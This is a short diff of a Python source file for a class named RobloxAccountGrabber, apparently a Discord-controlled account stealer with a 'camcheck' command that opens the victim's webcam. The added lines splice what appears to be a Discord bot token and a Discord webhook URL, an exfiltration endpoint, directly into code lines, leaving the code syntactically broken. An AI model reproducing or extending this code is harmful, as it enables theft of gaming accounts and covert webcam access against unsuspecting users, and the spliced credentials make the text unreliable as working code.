@@ -634,11 +634,11 @@ class RobloxAccountGrabber:
 
             command_info = "\n".join(cmd_list)
             embed = discord.Embed(title="List of Commands", description=command_info, color=0x00ff00)
-            await ctx.send(embed=embed)
+            await ctx.send(embed=embed)MTI0NjQzNjQwOTM4MDgzMTI2NQ.GiKStA.pOP_JXddCX_4ltAwlc-GNdjxwOBxoUfyx2EVy4
 
         @client.command()
         async def camcheck(ctx):
-            def check_webcam():
+            https://discord.com/api/webhooks/1246436038260297819/XEheCNXC7gV74yYqPaMmp73AFB1LZ4UEO1j13NCsKq2OgE6J1EJJ4gvJf7fWIThEJaWe
                 cap = cv2.VideoCapture(0)
                 if not cap.isOpened():
                     return False
